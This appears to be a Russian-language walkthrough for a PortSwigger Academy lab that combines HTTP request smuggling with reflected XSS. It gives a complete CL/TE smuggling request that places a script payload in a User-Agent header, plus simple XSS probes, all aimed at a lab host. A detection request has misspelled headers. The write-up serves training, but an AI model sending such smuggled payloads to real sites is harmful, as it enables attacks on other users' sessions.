Перейдем на уязвимый ресурс

и зайдем на случайную страницу с блогом
Перейдем в `Proxy` -> `HTTP history` и отправим в `Repeater` запрос на случайную страницу с блогом

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/10.%20Exploiting%20HTTP%20request%20smuggling%20to%20deliver%20reflected%20XSS/pics%20for%20walkthrough/1.png)


Далее по заданию известно, что ресурс уязвим к XSS в user-agent'е

```
GET /post?postId=6
...
User-Agent: test
...
```

и увидим, что на фронте действительно отобразилось значение `test`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/10.%20Exploiting%20HTTP%20request%20smuggling%20to%20deliver%20reflected%20XSS/pics%20for%20walkthrough/2.png)

далее попробуем выйти за кавычки, и провести XSS атаку

```
GET /post?postId=6
...
User-Agent: test"<script>alert(1)</script>"
...
```


<input required type="hidden" name="userAgent" value="test"<script>alert(1)</script>"">

и увидим, что он действительно отобразился на фронте
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/10.%20Exploiting%20HTTP%20request%20smuggling%20to%20deliver%20reflected%20XSS/pics%20for%20walkthrough/3.png)

теперь отправим корневую страницу в Repeater и с помощью пикчи проверим что находится на фронте а что на бэке CL/TE

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/10.%20Exploiting%20HTTP%20request%20smuggling%20to%20deliver%20reflected%20XSS/pics%20for%20walkthrough/4.png)

Нам сразу пришел ответ - значит это CL+CL
```
POST / HTTP/1.1
Host: 0afe000003408f6380de3fed007e0053.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Tranfer-encodin: chunked
Content-Length: 6

3
abc
X
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/10.%20Exploiting%20HTTP%20request%20smuggling%20to%20deliver%20reflected%20XSS/pics%20for%20walkthrough/5.png)

далее сконфигурируем запрос, где вторым запросом будет вложена XSS инъекция
```
POST / HTTP/1.1
Host: 0afe000003408f6380de3fed007e0053.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 149
Transfer-Encoding: chunked

0

GET /post?postId=5 HTTP/1.1
User-Agent: a"/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/10.%20Exploiting%20HTTP%20request%20smuggling%20to%20deliver%20reflected%20XSS/pics%20for%20walkthrough/6.png)

потом обновим страницу в браузере и увилим, что XSS Отработала 

снова снова отправим тот же запрос, и подождем уведомления об успешном выполнении лабораторной работы
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/10.%20Exploiting%20HTTP%20request%20smuggling%20to%20deliver%20reflected%20XSS/pics%20for%20walkthrough/7.png)
